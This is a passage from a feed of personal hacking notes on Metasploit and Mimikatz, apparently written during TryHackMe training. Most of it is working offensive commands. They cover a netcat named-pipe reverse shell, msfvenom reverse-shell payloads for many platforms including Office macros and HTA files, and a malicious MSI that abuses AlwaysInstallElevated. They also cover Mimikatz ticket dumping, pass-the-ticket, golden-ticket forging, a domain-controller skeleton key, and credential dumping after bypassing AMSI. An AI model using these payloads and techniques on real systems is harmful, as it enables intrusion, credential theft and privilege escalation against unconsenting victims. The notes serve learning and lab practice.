&lt;span id=&quot;cb5-4&quot;&gt;&lt;a href=&quot;#cb5-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;rm&lt;/span&gt; /tmp/qdsrgu&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Whatâs going on here?&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;mkfifo /tmp/qdsrgu&lt;/code&gt; creates a named pipe at /tmp/qdsrgu.&lt;/li&gt;&lt;li&gt;We then spin up a netcat instance directed at our local machine (&lt;code&gt;nc $LOCAL_IP $LOCAL_PORT&lt;/code&gt;), direct the contents of the pipe into netcatâs STDIN (&lt;code&gt;0&amp;lt; /tmp/qdsrgu&lt;/code&gt;), pipe the &lt;em&gt;output&lt;/em&gt; of netcat to a shell we know probably exists (&lt;code&gt;| /bin/sh&lt;/code&gt;), and finally redirect &lt;em&gt;both&lt;/em&gt; STDOUT and STDERR back into the named pipe (&lt;code&gt;&amp;gt; /tmp/qdsrgu 2&amp;gt;&amp;amp;1&lt;/code&gt;).&lt;/li&gt;&lt;li&gt;On the local machine, &lt;code&gt;nc -lvp $LOCAL_PORT&lt;/code&gt; listens for the incoming netcat connection from the remote. Anything we type on STDIN here gets sent to the remote and piped to /bin/sh &lt;em&gt;there&lt;/em&gt;. The output of /bin/sh is then sent to the named pipe, which dumps into (the remote) netcat, which then sends the data to the local machine where it ends up on STDOUT.&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Use &lt;code&gt;--list formats&lt;/code&gt; to see available encoding formats.&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb6&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb6-1&quot;&gt;&lt;a href=&quot;#cb6-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# 32-bit Linux ELF Meterpreter payload&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb6-2&quot;&gt;&lt;a href=&quot;#cb6-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb6-3&quot;&gt;&lt;a href=&quot;#cb6-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;msfvenom&lt;/span&gt; -p linux/x86/meterpreter/reverse_tcp &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb6-4&quot;&gt;&lt;a href=&quot;#cb6-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;va&quot;&gt;LHOST=$LOCAL_IP&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;LPORT=$LOCAL_PORT&lt;/span&gt; &lt;span class=&quot;ex&quot;&gt;-f&lt;/span&gt; elf -o revshell&lt;/span&gt;
&lt;span id=&quot;cb6-5&quot;&gt;&lt;a href=&quot;#cb6-5&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb6-6&quot;&gt;&lt;a href=&quot;#cb6-6&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# 32-bit macOS MACH-O Meterpreter payload&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb6-7&quot;&gt;&lt;a href=&quot;#cb6-7&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb6-8&quot;&gt;&lt;a href=&quot;#cb6-8&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;msfvenom&lt;/span&gt; -p osx/x86/shell_reverse_tcp &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb6-9&quot;&gt;&lt;a href=&quot;#cb6-9&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;va&quot;&gt;LHOST=$LOCAL_IP&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;LPORT=$LOCAL_PORT&lt;/span&gt; &lt;span class=&quot;ex&quot;&gt;-f&lt;/span&gt; macho -o revshell&lt;/span&gt;
&lt;span id=&quot;cb6-10&quot;&gt;&lt;a href=&quot;#cb6-10&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb6-11&quot;&gt;&lt;a href=&quot;#cb6-11&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# 32-bit (?) Windows executable Meterpreter payload&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb6-12&quot;&gt;&lt;a href=&quot;#cb6-12&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb6-13&quot;&gt;&lt;a href=&quot;#cb6-13&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;msfvenom&lt;/span&gt; -p windows/meterpreter/reverse_tcp &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb6-14&quot;&gt;&lt;a href=&quot;#cb6-14&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;va&quot;&gt;LHOST=$LOCAL_IP&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;LPORT=$LOCAL_PORT&lt;/span&gt; &lt;span class=&quot;ex&quot;&gt;-f&lt;/span&gt; exe -o revshell.exe&lt;/span&gt;
&lt;span id=&quot;cb6-15&quot;&gt;&lt;a href=&quot;#cb6-15&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb6-16&quot;&gt;&lt;a href=&quot;#cb6-16&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# PHP Meterpreter payload&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb6-17&quot;&gt;&lt;a href=&quot;#cb6-17&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb6-18&quot;&gt;&lt;a href=&quot;#cb6-18&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;msfvenom&lt;/span&gt; -p php/meterpreter_reverse_tcp &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb6-19&quot;&gt;&lt;a href=&quot;#cb6-19&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;va&quot;&gt;LHOST=$LOCAL_IP&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;LPORT=$LOCAL_PORT&lt;/span&gt; &lt;span class=&quot;ex&quot;&gt;-f&lt;/span&gt; raw -o revshell.php&lt;/span&gt;
&lt;span id=&quot;cb6-20&quot;&gt;&lt;a href=&quot;#cb6-20&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb6-21&quot;&gt;&lt;a href=&quot;#cb6-21&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# ASP Meterpreter payload&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb6-22&quot;&gt;&lt;a href=&quot;#cb6-22&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb6-23&quot;&gt;&lt;a href=&quot;#cb6-23&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;msfvenom&lt;/span&gt; -p windows/meterpreter/reverse_tcp &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb6-24&quot;&gt;&lt;a href=&quot;#cb6-24&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;va&quot;&gt;LHOST=$LOCAL_IP&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;LPORT=$LOCAL_PORT&lt;/span&gt; &lt;span class=&quot;ex&quot;&gt;-f&lt;/span&gt; asp -o revshell.asp&lt;/span&gt;
&lt;span id=&quot;cb6-25&quot;&gt;&lt;a href=&quot;#cb6-25&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb6-26&quot;&gt;&lt;a href=&quot;#cb6-26&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# JSP Meterpreter payload&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb6-27&quot;&gt;&lt;a href=&quot;#cb6-27&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb6-28&quot;&gt;&lt;a href=&quot;#cb6-28&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;msfvenom&lt;/span&gt; -p java/jsp_shell_reverse_tcp &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb6-29&quot;&gt;&lt;a href=&quot;#cb6-29&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;va&quot;&gt;LHOST=$LOCAL_IP&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;LPORT=$LOCAL_PORT&lt;/span&gt; &lt;span class=&quot;ex&quot;&gt;-f&lt;/span&gt; raw -o revshell.jsp&lt;/span&gt;
&lt;span id=&quot;cb6-30&quot;&gt;&lt;a href=&quot;#cb6-30&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb6-31&quot;&gt;&lt;a href=&quot;#cb6-31&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Python Meterpreter payload&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb6-32&quot;&gt;&lt;a href=&quot;#cb6-32&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb6-33&quot;&gt;&lt;a href=&quot;#cb6-33&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;msfvenom&lt;/span&gt; -p cmd/unix/reverse_python &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb6-34&quot;&gt;&lt;a href=&quot;#cb6-34&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;va&quot;&gt;LHOST=$LOCAL_IP&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;LPORT=$LOCAL_PORT&lt;/span&gt; &lt;span class=&quot;ex&quot;&gt;-f&lt;/span&gt; raw -o revshell.py&lt;/span&gt;
&lt;span id=&quot;cb6-35&quot;&gt;&lt;a href=&quot;#cb6-35&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb6-36&quot;&gt;&lt;a href=&quot;#cb6-36&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Bash Meterpreter payload&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb6-37&quot;&gt;&lt;a href=&quot;#cb6-37&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb6-38&quot;&gt;&lt;a href=&quot;#cb6-38&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;msfvenom&lt;/span&gt; -p cmd/unix/reverse_bash &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb6-39&quot;&gt;&lt;a href=&quot;#cb6-39&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;va&quot;&gt;LHOST=$LOCAL_IP&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;LPORT=$LOCAL_PORT&lt;/span&gt; &lt;span class=&quot;ex&quot;&gt;-f&lt;/span&gt; raw -o revshell.sh&lt;/span&gt;
&lt;span id=&quot;cb6-40&quot;&gt;&lt;a href=&quot;#cb6-40&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb6-41&quot;&gt;&lt;a href=&quot;#cb6-41&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Perl Meterpreter payload&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb6-42&quot;&gt;&lt;a href=&quot;#cb6-42&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb6-43&quot;&gt;&lt;a href=&quot;#cb6-43&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;msfvenom&lt;/span&gt; -p cmd/unix/reverse_perl &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb6-44&quot;&gt;&lt;a href=&quot;#cb6-44&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;va&quot;&gt;LHOST=$LOCAL_IP&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;LPORT=$LOCAL_PORT&lt;/span&gt; &lt;span class=&quot;ex&quot;&gt;-f&lt;/span&gt; raw -o revshell.pl&lt;/span&gt;
&lt;span id=&quot;cb6-45&quot;&gt;&lt;a href=&quot;#cb6-45&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb6-46&quot;&gt;&lt;a href=&quot;#cb6-46&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# HTA Meterpreter payload&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb6-47&quot;&gt;&lt;a href=&quot;#cb6-47&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb6-48&quot;&gt;&lt;a href=&quot;#cb6-48&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;msfvenom&lt;/span&gt; -p windows/meterpreter/reverse_tcp &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb6-49&quot;&gt;&lt;a href=&quot;#cb6-49&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;va&quot;&gt;LHOST=$LOCAL_IP&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;LPORT=$LOCAL_PORT&lt;/span&gt; &lt;span class=&quot;ex&quot;&gt;-f&lt;/span&gt; hta-psh -o revshell.hta&lt;/span&gt;
&lt;span id=&quot;cb6-50&quot;&gt;&lt;a href=&quot;#cb6-50&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb6-51&quot;&gt;&lt;a href=&quot;#cb6-51&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# VBA Meterpreter payload&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb6-52&quot;&gt;&lt;a href=&quot;#cb6-52&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb6-53&quot;&gt;&lt;a href=&quot;#cb6-53&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Note that this can&amp;#39;t be used as-is, but must first be copied&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb6-54&quot;&gt;&lt;a href=&quot;#cb6-54&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# into a Microsoft Office document as a macro. The generated&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb6-55&quot;&gt;&lt;a href=&quot;#cb6-55&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# code hooks the Workbook_Open() function, but this must be&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb6-56&quot;&gt;&lt;a href=&quot;#cb6-56&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# changed to Document_Open() for Word.&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb6-57&quot;&gt;&lt;a href=&quot;#cb6-57&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb6-58&quot;&gt;&lt;a href=&quot;#cb6-58&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;msfvenom&lt;/span&gt; -p windows/meterpreter/reverse_tcp &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb6-59&quot;&gt;&lt;a href=&quot;#cb6-59&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;va&quot;&gt;LHOST=$LOCAL_IP&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;LPORT=$LOCAL_PORT&lt;/span&gt; &lt;span class=&quot;ex&quot;&gt;-f&lt;/span&gt; vba -o revshell.vba&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;System-specific shell codes can also be produced by appropriately varying the &lt;code&gt;-f&lt;/code&gt; option.&lt;/p&gt;&lt;h4 id=&quot;additional-resources-6&quot;&gt;Additional Resources&lt;/h4&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://www.infosecmatter.com/metasploit-module-library/?mm=post/multi/manage/shell_to_meterpreter&quot;&gt;Shell to Meterpreter Upgrade&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://tryhackme.com/room/weaponization&quot;&gt;TryHackMe: Weaponization&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/./Exploiting%20HTML%20Applications.md&quot;&gt;Exploiting HTML Applications&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h3 id=&quot;32-bit-windows-programs&quot;&gt;32-Bit Windows Programs&lt;/h3&gt;&lt;p&gt;By default, msfvenom produces 64-bit executables when using the &lt;code&gt;-f exe&lt;/code&gt;. This doesnât work, however, if youâre trying to replace a program in Program Files (x86). In this case, youâll need to explicitly instruct msfvenom to encode a 32-bit binary using &lt;code&gt;-e x86/shikata_ga_nai&lt;/code&gt;.&lt;/p&gt;&lt;h4 id=&quot;additional-resources-7&quot;&gt;Additional Resources&lt;/h4&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://security.stackexchange.com/a/83410&quot;&gt;How do you send a 64 bit meterpreter stager?&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h3 id=&quot;malicious-msi-files&quot;&gt;Malicious MSI Files&lt;/h3&gt;&lt;p&gt;If &lt;code&gt;AlwaysInstallElevated&lt;/code&gt; is set to 1 under both of the following registry keys, then MSI installers will run as SYSTEM.&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb7&quot;&gt;&lt;pre class=&quot;sourceCode powershell&quot;&gt;&lt;code class=&quot;sourceCode powershell&quot;&gt;&lt;span id=&quot;cb7-1&quot;&gt;&lt;a href=&quot;#cb7-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;reg query HKCU\Software\Policies\Microsoft\Windows\Installer&lt;/span&gt;
&lt;span id=&quot;cb7-2&quot;&gt;&lt;a href=&quot;#cb7-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Generate a malicious MSI file with msfvenom:&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb8&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb8-1&quot;&gt;&lt;a href=&quot;#cb8-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;msfvenom&lt;/span&gt; -p windows/x64/shell_reverse_tcp &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb8-2&quot;&gt;&lt;a href=&quot;#cb8-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;va&quot;&gt;LHOST=$ATTACKER_IP&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;LPORT=$ATTACKER_PORT&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb8-3&quot;&gt;&lt;a href=&quot;#cb8-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;        &lt;span class=&quot;ex&quot;&gt;-f&lt;/span&gt; msi -o &lt;span class=&quot;va&quot;&gt;$INSTALLER&lt;/span&gt;.msi&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Then install on the target to get a shell:&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb9&quot;&gt;&lt;pre class=&quot;sourceCode powershell&quot;&gt;&lt;code class=&quot;sourceCode powershell&quot;&gt;&lt;span id=&quot;cb9-1&quot;&gt;&lt;a href=&quot;#cb9-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;msiexec /quiet /qn /i &lt;span class=&quot;va&quot;&gt;$INSTALLER&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;msi&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&quot;catching-shells&quot;&gt;Catching Shells&lt;/h3&gt;&lt;p&gt;Use the &lt;code&gt;exploit/multi/handler&lt;/code&gt; module in Metasploit to catch the shells produced using msfvenom. Note that youâll need to use &lt;code&gt;set payload&lt;/code&gt; to tell Metasploit &lt;em&gt;what&lt;/em&gt; itâs catching â for example, &lt;code&gt;windows/meterpreter/reverse_tcp&lt;/code&gt;. We can catch both regular reverse shells and meterpreter sessions this way.&lt;/p&gt;&lt;h4 id=&quot;additional-resources-8&quot;&gt;Additional Resources&lt;/h4&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://tryhackme.com/room/weaponization&quot;&gt;TryHackMe: Weaponization&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Wed, 19 Apr 2023 14:31:45 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Using%20Metasploit.md</guid>
		</item>
		<item>
			<title>Using Mimikatz</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Using%20Mimikatz.md</link>
			<description>&lt;p&gt;Mimikatz needs to be run with administrative privileges (on the local machine), and provides its own command prompt. Use the &lt;code&gt;privilege::debug&lt;/code&gt; command to check if you're running with the right privileges.&lt;/p&gt;&lt;h2 id=&quot;dumping-tickets&quot;&gt;Dumping Tickets&lt;/h2&gt;&lt;p&gt;Mimikatz can dump ticket granting tickets (and session keys) from the memory of Windows' Local Security Authority Subsystem Service (LSASS); these can then be used to for privilege elevation or lateral movement (depending on which users are active on that machine).&lt;/p&gt;&lt;p&gt;Use the &lt;code&gt;sekurlsa::tickets /export&lt;/code&gt; command to dump any Kerberos &quot;tickets&quot; (really ticket + session key data structures) from LSASS's memory as .kirbi files. Tickets are named like ID-USER-SERVICE-DOMAIN.kirbi; ticket granting tickets have a &lt;code&gt;krbtgt&lt;/code&gt; SERVICE name. If you can find a &lt;code&gt;krbtgt&lt;/code&gt; ticket belonging to an administrator account, then you've (almost) struck gold.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/./Kerberos.md&quot;&gt;Kerberos&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;pass-the-ticket-attacks&quot;&gt;Pass the Ticket Attacks&lt;/h2&gt;&lt;p&gt;Use the &lt;code&gt;kerberos::ptt TICKET_FILE&lt;/code&gt; command to load the data structure in the specified .kirbi file into memory (allowing the account you're logged in as to &quot;pass the ticket&quot; and impersonate the user whose ticket you've harvested).&lt;/p&gt;&lt;h2 id=&quot;goldensilver-ticket-attacks&quot;&gt;Golden/Silver Ticket Attacks&lt;/h2&gt;&lt;p&gt;To generate a gold or silver ticket using Mimikatz, begin by running the &lt;code&gt;lsadump::lsa /inject /name:SERVICE&lt;/code&gt; command to retrieve the service SID and NTLM password hash for that service. If SERVICE is &lt;code&gt;krbtgt&lt;/code&gt; then this will allow the creation of a golden ticket, otherwise you'll be creating a silver ticket.&lt;/p&gt;&lt;p&gt;(You can also use a user name instead of SERVICE, in which case it appears that Mimikatz will just request a ticket granting ticket from the KDC as that user in the next step; this is theoretically just as noisy as a golden ticket, but looks more &quot;normal&quot;.)&lt;/p&gt;&lt;p&gt;To actually create and cache the ticket, use &lt;code&gt;Kerberos::golden /user:USER /domain:DOMAIN /sid:SID /krbtgt:HASH /id:TYPE&lt;/code&gt;, where:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;USER&lt;/code&gt; is the user to create the ticket for (probably the one you've compromised).&lt;/li&gt;&lt;li&gt;&lt;code&gt;DOMAIN&lt;/code&gt; is the domain to create the ticket for.&lt;/li&gt;&lt;li&gt;&lt;code&gt;SID&lt;/code&gt; is the SID of the service from the previous step.&lt;/li&gt;&lt;li&gt;&lt;code&gt;HASH&lt;/code&gt; is the NT hash of the service password from the previous step.&lt;/li&gt;&lt;li&gt;&lt;code&gt;TYPE&lt;/code&gt; is the type of Kerberos ticket to create; use 500 for a golden (ticket granting) ticket, and 1103 for a service ticket.&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Once the ticket has been created, use &lt;code&gt;misc::cmd&lt;/code&gt; to open a command prompt using the newly forged ticket.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/./Windows%20Password%20Hashes.md&quot;&gt;Windows Password Hashes&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;kdc-skeleton-key&quot;&gt;KDC Skeleton Key&lt;/h2&gt;&lt;p&gt;If Mimikatz is run on a domain controller, it can modify the authentication service's memory using the &lt;code&gt;misc::skeleton&lt;/code&gt; command to cause it to attempt to decrypt the AS-REQ using &lt;em&gt;both&lt;/em&gt; the user's NT hash &lt;em&gt;and&lt;/em&gt; an NT hash of your choosing (by default &lt;code&gt;60BA4FCADC466C7A033C178194C03DF6&lt;/code&gt;, which is just &lt;code&gt;mimikatz&lt;/code&gt;). This means that you can send an AS-REQ as any user using the &quot;skeleton key&quot; hash to gain access as that user, similar to a golden ticket attack.&lt;/p&gt;&lt;p&gt;Obviously this isn't very persistent itself, as the skeleton key will be lost if the server is rebooted or the authentication service restarted.&lt;/p&gt;&lt;h2 id=&quot;pure-powershell-implementation&quot;&gt;Pure PowerShell Implementation&lt;/h2&gt;&lt;p&gt;Mimikatz binaries are generally detected by AV on download these days, but fortunately there's a PowerShell reimplementation available from the Empire Project that can be run after bypassing AMSI.&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb1&quot;&gt;&lt;pre class=&quot;sourceCode powershell&quot;&gt;&lt;code class=&quot;sourceCode powershell&quot;&gt;&lt;span id=&quot;cb1-1&quot;&gt;&lt;a href=&quot;#cb1-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;Invoke-Mimikatz -Command &amp;#39;&lt;span class=&quot;st&quot;&gt;&amp;quot;privilege::debug&amp;quot;&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;&amp;quot;token::elevate&amp;quot;&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;&amp;quot;sekurlsa::logonpasswords&amp;quot;&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;&amp;quot;lsadump::sam&amp;quot;&lt;/span&gt; &lt;span 